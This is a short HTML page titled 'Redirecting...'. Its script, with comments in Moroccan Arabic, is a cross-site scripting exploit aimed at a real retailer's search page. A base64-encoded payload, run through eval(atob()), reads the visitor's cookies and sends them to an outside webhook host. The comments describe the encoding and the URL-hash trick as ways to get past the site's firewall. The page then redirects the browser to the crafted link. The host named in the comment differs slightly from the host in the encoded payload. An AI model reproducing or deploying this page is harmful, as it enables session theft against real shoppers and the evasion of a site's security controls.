<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // 1. الكود الحقيقي اللي غيتنفذ (var i=new Image(); i.src='https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0')
        // هاد الكود مشفر باش ما يفييقش الـ WAF
        let payload = "dmFyIGk9bmV3IEltYWdlKCk7IGkuc3JjPSdodHRwczovL3dla2hvb2suc2l0LzJjYmM3MmViLTVmNDItNDRmOS05OThiLTdhOGRkMjYxMWVmMD9kYXRhPScrd2luZG93LmJ0b2EoZG9jdW1lbnQuY29va2llKTs=";

        // 2. محاولة الخروج من النص (String) باستعمال علامة التنصيص
        // استعملنا الـ eval(atob()) باش ننفذو الكود المشفر
        let targetPayload = "'-eval(atob('" + payload + "'))-'";

        // 3. بناء الرابط باستعمال الـ Hash (#) لضمان تجاوز الـ WAF
        let target = "https://www.decathlon.com/search?q=test#" + encodeURIComponent(targetPayload);

        // تحويل المتصفح للهدف
        window.location.href = target;
    </script>
</body>
</html>
